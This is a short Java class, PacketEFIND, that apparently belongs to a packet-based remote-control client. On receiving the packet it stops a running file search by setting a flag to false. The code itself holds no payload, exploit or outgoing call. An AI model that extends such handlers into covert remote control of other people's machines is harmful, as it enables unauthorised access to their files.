package com.redpois0n.packets.incoming;

import com.redpois0n.FileSearch;

public class PacketEFIND extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		FileSearch.running = false;
	}

}
